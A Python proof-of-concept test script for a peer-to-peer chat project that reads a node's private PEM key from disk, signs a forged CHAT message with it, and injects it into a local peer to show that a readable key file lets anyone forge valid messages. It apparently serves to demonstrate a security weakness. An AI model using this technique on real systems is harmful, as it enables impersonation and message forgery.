"""
PoC: Read PEM and forge signed CHAT frame
Run: python tools\tests\forge_signed_frame.py

This script loads the node private key used by the running peer (or created by the project)
and uses it to sign a CHAT envelope, then feeds it into the local PeerNode.on_frame to show
that a valid signature can be produced if the private key is readable.
"""
import os
import asyncio
import logging
from types import SimpleNamespace

import sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'python-peer'))

from socp.storage_sqlite import Store
from socp.p2p import PeerNode
from socp.crypto import load_or_create_key, sign_pss_b64
from socp.proto import new_envelope, compact_json

logging.basicConfig(level=logging.INFO)


def main():
    cfg = SimpleNamespace(bind_host="127.0.0.1", bind_port=8047, nick="victim")
    db_path = os.path.join(os.path.dirname(__file__), '..', '..', 'var', 'socp.db')
    store = Store(db_path)
    node = PeerNode(cfg, store)

    key_path = os.path.join(os.path.dirname(__file__), '..', '..', 'var', f'node_key_{cfg.bind_port}.pem')
    if not os.path.exists(key_path):
        print(f"Key file {key_path} not found. Creating one for demo.")
        sk = load_or_create_key(path=key_path)
    else:
        print(f"Loading existing key {key_path}")
        sk = load_or_create_key(path=key_path)

    env = new_envelope(typ="CHAT", to="group:public", frm=node.fid, ttl=6, body={"text": "forged by key on disk"})

    # Use node's canonical bytes helper if available, otherwise fall back to proto.compact_json
    try:
        canon = node._canonical_bytes_for_sig(env)
        if isinstance(canon, str):
            canon = canon.encode()
    except Exception:
        canon = compact_json(env).encode()

    sig = sign_pss_b64(sk, canon)
    env['sig'] = sig
    frame = compact_json(env)

    asyncio.run(node.on_frame(None, frame))
    print("Injected signed CHAT frame; check DB or logs for message entry.")

if __name__ == '__main__':
    main()
